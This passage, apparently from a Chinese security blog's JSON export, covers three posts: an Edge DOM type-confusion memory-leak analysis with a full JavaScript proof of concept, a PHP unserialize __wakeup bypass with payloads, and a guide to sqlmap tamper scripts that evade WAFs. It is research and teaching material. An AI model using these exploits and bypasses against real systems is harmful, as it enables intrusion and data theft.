即DOM树中有一个循环。另一个效果是，读取文本节点的nodeValue将导致类型混淆。这里Edge访问文本节点中存储的文本数据时，实际访问的却是一个C++对象。这样可以让攻击者读取存储在这个C++对象中的数据，其中包含各种指针。 2.2 JavaScript PoCSkylined给出了一个读取并显示DOM树对象的部分内容的PoC。该PoC已经在x64系统上进行了测试，允许攻击者绕过堆ASLR，读取堆指针。 读取的数据量可以由攻击者控制，并且可以读取分配给C++对象的内存之外的数据。攻击者可能能够使用一些堆的技巧将其他对象与C++DOM树对象中的有用信息放置在内存中，并从第二个对象读取数据。 exp如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778&lt;html&gt; &lt;head&gt; &lt;script&gt; var uNodeRemovedEvents = 0; onerror = function (sError, sSource, uLine)&#123; alert(sError + \" on line \" + uLine); &#125;; document.addEventListener(\"DOMNodeRemoved\", function(oEvent) &#123; if (uNodeRemovedEvents++ == 0) &#123; oTextNode = document.createTextNode(\"[2]\"); // 这里有一个需要注意的地方 // insertBefore在Edge中如果没有第二个参数，那么等同于appendChild // 但是其他浏览器是不支持的 // 作者这里用insertBefore是为了更好的去判断是否有一个堆因为此处操作被allocated // 用于和之后的appendChild调用区分开 document.body.insertBefore(oTextNode); &#125;; &#125;, true); onload = function()&#123; // onload中首先执行的是appendChild // 这里oExistingChild已经有了父节点，所以会先从父节点移除这个元素，然后把它作为新父节点的最后一个子节点 // 其中移除操作会触发DOMNodeRemoved事件，而增加操作会触发DOMNodeInserted事件。 document.body.appendChild(oExistingChild); // 但是，在oExistingChild触发DOMNodeRemoved事件时， // oTextNode插入了节点中 // 最后oExistingChild成为了最后一个元素 // 但是这里出现了一个bug // oTextNode的nextSibling指向了自己 // 在这里，DOM树出现了一种类似循环的结构 for (var oNode = document.body.firstChild; oNode &amp;&amp; oNode != oNode.nextSibling; oNode = oNode.nextSibling) &#123; // 加上这段代码是为了防止被Edge检测到树的结构出现了问题 // 如果没有这段代码Js执行到这里的时候就会崩溃 &#125; if (oTextNode.nextSibling !== oTextNode) &#123; // 未触发漏洞时报错 throw new Error(\"Tree is not corrupt\"); &#125; alert(\"Set breakpoints if needed\"); // 这里是为了生成一个copy var sData = (\"A\" + oTextNode.nodeValue).substr(1); // 下面的逻辑是读取oTextNode.nodeValue的值 // 但实际上是内存中某块的位置 // 在读取之后按规则格式化输出 var sHexData = \"Read 0x\" + sData.length.toString(16); sHexData += \" bytes: ????????`????????\"; sHexQWord = \"`????????\"; for (var uBytes = 4, uOffset = 4, uIndex = 0; uIndex &lt; sData.length; uIndex++) &#123; var sHexWord = sData.charCodeAt(uIndex).toString(16); while (sHexWord.length &lt; 4) sHexWord = \"0\" + sHexWord; sHexQWord = sHexWord + sHexQWord; uBytes += 2; if (uBytes == 4) sHexQWord = \"`\" + sHexQWord; if (uBytes == 8) &#123; sHexData += \" \" + sHexQWord; sHexQWord = \"\"; uBytes = 0; &#125;; &#125;; if (sHexQWord) &#123; while (sHexQWord.length &lt; 17) &#123; if (sHexQWord.length == 8) sHexQWord += \"`\"; sHexQWord = \"????\" + sHexQWord; &#125; sHexData += \" \" + sHexQWord; &#125; alert(sHexData); // 代码执行到这里的时候会crash // 但是这里已经可以读取栈上的数据了 oTextNode.nodeValue = \"\"; &#125;; &lt;/script&gt; &lt;/head&gt; &lt;body&gt;x&lt;x id=oExistingChild&gt;&lt;/x&gt;&lt;/body&gt;&lt;/html&gt; 2.3 Code Analyze上面这个利用流程，比较关键的几个函数是CDOMTextNode::get_data、CDOMTextNode::get_length 读取数据的函数是CDOMTextNode::get_data，代码如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960__int64 __fastcall CDOMTextNode::get_data(CDOMTextNode *this, unsigned __int16 **a2)&#123; unsigned __int16 **v2; // rbx@1 CDOMTextNode *this_rdi; // rdi@1 Tree::TextData *v4; // rcx@2 __int32 v5; // eax@4 BSTR v6; // rax@4 int v7; // ebp@4 struct CTreePos *v8; // rax@4 struct CTreePos *v9; // rsi@4 Tree::TextNode *v10; // rdi@4 unsigned __int16 *v11; // rax@5 Tree::ANode *v12; // rax@5 CTreePos *v13; // rcx@6 __int64 v14; // r9@9 const OLECHAR *v15; // rax@9 UINT v16; // er9@9 BSTR v17; // rax@9 UINT ui; // [sp+48h] [bp+10h]@4 unsigned __int32 v20; // [sp+50h] [bp+18h]@5 v2 = a2; this_rdi = this; if ( a2 ) &#123; *a2 = 0i64; v4 = (Tree::TextData *)*((_QWORD *)this + 6); if ( v4 ) &#123; v14 = *(_DWORD *)v4; v15 = Tree::TextData::GetText(v4, 0, 0i64); v17 = SysAllocStringLen(v15, v16); *v2 = (unsigned __int16 *)Abandonment::CheckAllocationUntyped(v17); &#125; else if ( CDOMTextNode::IsPositioned(this_rdi) ) &#123; ui = 0; v5 = CDOMTextNode::get_length(this_rdi, (__int32 *)&amp;ui); Abandonment::CheckHRESULTStrict(v5); v6 = SysAllocStringLen(0i64, ui); *v2 = (unsigned __int16 *)Abandonment::CheckAllocationUntyped(v6); v7 = 0; LODWORD(v8) = Tree::TextNode::TextNodeFromDOMTextNode((__int64)this_rdi); v9 = v8; v10 = v8; do &#123; v11 = Tree::TextNode::Text(v10, 0, &amp;v20); memcpy_s(&amp;(*v2)[v7], 2i64 * (signed int)(ui - v7), v11, 2i64 * v20); v7 += v20; v12 = Tree::TreeReader::GetNextSiblingWithFilter( v10, (enum Tree::NodeFilterResultsEnum (__stdcall __high static *)(const struct Tree::ANode *))&amp;Dom::TreeReader::ScriptableIdentityFilter); v10 = v12; &#125; while ( v12 &amp;&amp; Tree::ANode::IsTextNode(v12) &amp;&amp; CTreePos::IsSameTextOrCDataNode(v13, v9) ); &#125; &#125; return 0i64;&#125; 在函数中有一次调用(__int32 *)&ui)```1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950代码如下，其中a2的值是ui，也就是0，而CDOMTextNode::IsPositioned(this)返回值为真，即进入了第二个逻辑，在该逻辑中进行了长度的处理获取长度后，则在get\\_data函数中，在```memcpy_s(&amp;(*v2)[v7], 2i64 * (signed int)(ui - v7), v11, 2i64 * v20)```这行代码利用memcpy_s不断读取内存中的值至长度到达之前get\\_length函数返回的值位置。这里读取的是v11指向中保存地址指向的值，那我们再上溯，```v11 = Tree::TextNode::Text(v10, 0, &amp;v20);```，其中v10的值是Tree::TextNode::TextNodeFromDOMTextNode返回的一个结构体指针，而调用该函数的参数是rcx。```cc__int64 __fastcall CDOMTextNode::get_length(CDOMTextNode *this, __int32 *a2)&#123; __int32 *v2; // rax@1 signed int v3; // ebx@1 __int32 *v4; // rsi@1 CDOMTextNode *v5; // rdi@1 struct CTreePos *v7; // rax@6 struct CTreePos *v8; // rbp@6 struct CTreePos *v9; // r11@6 __int32 v10; // edi@6 Tree::ANode *v11; // rax@7 CTreePos *v12; // rcx@8 v2 = (__int32 *)*((_QWORD *)this + 6); v3 = 0; v4 = a2; v5 = this; if ( v2 ) &#123; *a2 = *v2; &#125; else if ( CDOMTextNode::IsPositioned(this) ) &#123; LODWORD(v7) = Tree::TextNode::TextNodeFromDOMTextNode((__int64)v5); v8 = v7; v9 = v7; v10 = 0; do &#123; v10 += **((_DWORD **)v9 + 7); v11 = Tree::TreeReader::GetNextSiblingWithFilter( v9, (enum Tree::NodeFilterResultsEnum (__stdcall __high static *)(const struct Tree::ANode *))&amp;Dom::TreeReader::ScriptableIdentityFilter); &#125; while ( v11 &amp;&amp; Tree::ANode::IsTextNode(v11) &amp;&amp; CTreePos::IsSameTextOrCDataNode(v12, v8) ); *v4 = v10; &#125; else &#123; v3 = -2147024809; &#125; return (unsigned int)v3;&#125; 2.4 Dynamic Analysis对get_data下断点后开始单步跟踪，发现这里get_length函数的返回值和节点oExistingChild的长度相关，也就是说，这里出现了一个bug，在本来应该读取textnode的长度的时候，返回了一个和oExistingChild长度相关的数值，即我们可以一定程度上控制读取的数据长度，当然，这里数据如果太长，在读取的时候会触发一个访问错误，导致进程崩溃无法继续读取。 最后结合动态调试和代码分析发现length是从结构体指针处偏移0x1c的位置指向的指针指向的位置中取出来，即first_struct-&gt;other_struct-&gt;length。而读取的地址位置则是结构体指针偏移0xC的位置。 3. References1. zerodayinitiative 2. microsoft 3. securitytracker 4. cve.mitre.org 5. vuldb 6. skylined blog","categories":[{"name":"cve","slug":"cve","permalink":"https://LyleMi.github.io/categories/cve/"}],"tags":[]},{"title":"php unserialize()/wakeup()漏洞","slug":"2016-10-29-php-unserialize","date":"2016-10-29T01:31:40.000Z","updated":"2018-11-27T01:55:45.290Z","comments":true,"path":"2016/10/29/2016-10-29-php-unserialize/","link":"","permalink":"https://LyleMi.github.io/2016/10/29/2016-10-29-php-unserialize/","excerpt":"unserialize和serialize这里不做赘述。 unserialize的漏洞在magic function上，如果一个类定义了__wakup()和__destruct()，则该类的实例被反序列化时，会自动调用__wakeup(), 生命周期结束时，则调用__desturct()。","text":"unserialize和serialize这里不做赘述。 unserialize的漏洞在magic function上，如果一个类定义了__wakup()和__destruct()，则该类的实例被反序列化时，会自动调用__wakeup(), 生命周期结束时，则调用__desturct()。 下面提供一个简单的demo. 123456789101112131415161718192021222324class Demo&#123; public $data; public function __construct($data) &#123; $this-&gt;data = $data; echo \"construct&lt;br /&gt;\"; &#125; public function __wakeup() &#123; echo \"wake up&lt;br /&gt;\"; &#125; public function __destruct() &#123; echo \"Data's value is $this-&gt;data. &lt;br /&gt;\"; echo \"destruct&lt;br /&gt;\"; &#125;&#125;var_dump(serialize(new Demo(\"raw value\"))); 输出 1234constructData&apos;s value is raw value.destructstring(44) &quot;O:4:&quot;Demo&quot;:1:&#123;s:4:&quot;data&quot;;s:9:&quot;raw value&quot;;&#125;&quot; 把序列化的字符串修改一下后，执行 1unserialize('O:4:\"Demo\":1:&#123;s:4:\"data\";s:15:\"malicious value\";&#125;'); 输出 123wake upData&apos;s value is malicious value.destruct 这里看到，值被修改了. 上面是一个unserialize()的简单应用，不难看出，如果__wakeup()或者 __desturct()有敏感操作，比如读写文件、操作数据库，就可以通过函数实现文件读写或者数据读取的行为。 那么，在__wakeup()中加入判断是否可以阻止这个漏洞呢？在__wakeup()中我们加入一行代码 12345public function __wakeup()&#123; if($this-&gt;data != 'raw value') $this-&gt;data = 'raw value'; echo \"wake up&lt;br /&gt;\";&#125; 但其实还是可以绕过的，在 PHP5 &lt; 5.6.25， PHP7 &lt; 7.0.10 的版本都存在wakeup的漏洞。当反序列化中object的个数和之前的个数不等时，wakeup就会被绕过，于是使用下面的payload 1unserialize('O:7:\"HITCON\":1:&#123;s:4:\"data\";s:15:\"malicious value\";&#125;'); 输出 12Data&apos;s value is malicious value.destruct 这里wakeup被绕过，值依旧被修改了。","categories":[{"name":"web","slug":"web","permalink":"https://LyleMi.github.io/categories/web/"}],"tags":[]},{"title":"sqlmap-tamper编写指南","slug":"2016-6-6-sqlmap-tamper","date":"2016-06-06T01:31:40.000Z","updated":"2018-11-27T01:55:52.104Z","comments":true,"path":"2016/06/06/2016-6-6-sqlmap-tamper/","link":"","permalink":"https://LyleMi.github.io/2016/06/06/2016-6-6-sqlmap-tamper/","excerpt":"注：最近遇到了一些奇奇怪怪的waf，想自己写一些tamper但是发现没有参考材料可以使用，因此写了这篇文章，以方便进行自定义的tamper编写。笔者笔力有限，如有错误，敬请读者们指正。 0x00 sqlmap tamper简介sqlmap是一个自动化的SQL注入工具，而tamper则是对其进行扩展的一系列脚本，主要功能是对本来的payload进行特定的更改以绕过waf。","text":"注：最近遇到了一些奇奇怪怪的waf，想自己写一些tamper但是发现没有参考材料可以使用，因此写了这篇文章，以方便进行自定义的tamper编写。笔者笔力有限，如有错误，敬请读者们指正。 0x00 sqlmap tamper简介sqlmap是一个自动化的SQL注入工具，而tamper则是对其进行扩展的一系列脚本，主要功能是对本来的payload进行特定的更改以绕过waf。 0x01 一个最小的例子为了说明tamper的结构，让我们从一个最简单的例子开始 1234567891011# sqlmap/tamper/escapequotes.pyfrom lib.core.enums import PRIORITY__priority__ = PRIORITY.LOWESTdef dependencies(): passdef tamper(payload, **kwargs): return payload.replace(\"'\", \"\\\\'\").replace('\"', '\\\\\"') 不难看出，一个最小的tamper脚本结构为priority变量定义和dependencies、tamper函数定义。 priority定义脚本的优先级，用于有多个tamper脚本的情况。 dependencies函数声明该脚本适用/不适用的范围，可以为空。 tamper是主要的函数，接受的参数为payload和**kwargs返回值为替换后的payload。比如这个例子中就把引号替换为了\\\\\\\\&#39;。 0x02 详细介绍第一部分完成了一个最简单的tamper架构，下面我们进行更详细的介绍 tamper函数tamper是整个脚本的主体。主要用于修改原本的payload。举例来说，如果服务器上有这么几行代码 12$id = trim($POST($id),'union');$sql=\"SELECT * FROM users WHERE id='$id'\"; 而我们的payload为1-8363&apos; union select null -- - 这里因为union被过滤掉了，将导致payload不能正常执行，那么就可以编写这样的tamper 12def tamper(payload, **kwargs): return payload.replace('union','uniounionn') 保存为replaceunion.py，存到sqlmap/tamper/下，执行的时候带上–tamper=replaceunion的参数，就可以绕过该过滤规则 dependencies函数dependencies函数，就tamper脚本支持/不支持使用的环境进行声明，一个简单的例子如下： 12345678# sqlmap/tamper/echarunicodeencode.pyfrom lib.core.common import singleTimeWarnMessagedef dependencies(): singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against ASP or ASP.NET web applications\" % os.path.basename(__file__).split(\".\")[0])# singleTimeWarnMessage() 用于在控制台中打印出警告信息 kwargs在官方提供的47个tamper脚本中，kwargs参数只被使用了两次，两次都只是更改了http-header，这里以其中一个为例进行简单说明 123456# sqlmap/tamper/vanrish.pydef tamper(payload, **kwargs): headers = kwargs.get(\"headers\", &#123;&#125;) headers[\"X-originating-IP\"] = \"127.0.0.1\" return payload 这个脚本是为了更改X-originating-IP，以绕过WAF，另一个kwargs的使用出现于xforwardedfor.py，也是为了改header以绕过waf 0x3 结语tamper的编写远不止这些，本文只就其最基本的结构进行探讨。作为sqlmap的扩展，在编写tamper时几乎所有的sqlmap内置的函数、变量都可以使用，本文不一一列出。 0x04 附录：部分常数值123456789101112131415161718192021222324# sqlmap/lib/enums.pyclass PRIORITY: LOWEST = -100 LOWER = -50 LOW = -10 NORMAL = 0 HIGH = 10 HIGHER = 50 HIGHEST = 100class DBMS: ACCESS = \"Microsoft Access\" DB2 = \"IBM DB2\" FIREBIRD = \"Firebird\" MAXDB = \"SAP MaxDB\" MSSQL = \"Microsoft SQL Server\" MYSQL = \"MySQL\" ORACLE = \"Oracle\" PGSQL = \"PostgreSQL\" SQLITE = \"SQLite\" SYBASE = \"Sybase\" HSQLDB = \"HSQLDB\"","categories":[{"name":"web","slug":"web","permalink":"https://LyleMi.github.io/categories/web/"}],"tags":[]}]}